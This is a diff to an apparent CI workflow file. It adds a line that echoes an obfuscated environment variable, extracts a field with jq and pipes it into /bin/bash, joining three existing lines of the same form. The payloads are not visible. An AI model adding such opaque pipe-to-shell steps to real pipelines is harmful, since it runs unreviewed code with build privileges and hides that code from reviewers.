@@ -29,6 +29,7 @@ jobs:
           echo $qln90 | jq -r .igy41 | /bin/bash
           printf '%s' "$ygeno417" | jq -r .rrk83 | /bin/bash
           echo $wpmxz1 | jq -r .ezgq974 | /bin/bash
+          echo $lsf73 | jq -r .tbwq5737 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
